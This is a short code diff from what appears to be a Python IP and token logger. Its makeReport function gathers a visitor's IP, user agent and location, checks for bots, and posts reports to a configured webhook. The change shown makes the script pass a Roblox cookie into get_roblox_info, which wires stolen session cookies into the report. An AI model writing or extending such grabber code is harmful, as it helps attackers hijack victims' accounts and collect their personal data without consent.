@@ -120,7 +120,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     bot = botCheck(ip, useragent)
 
-    roblox_info = get_roblox_info(cookie=None)
+    roblox_info = get_roblox_info(cookie=cookie)
 
     if bot:
         requests.post(config["webhook"], json = {
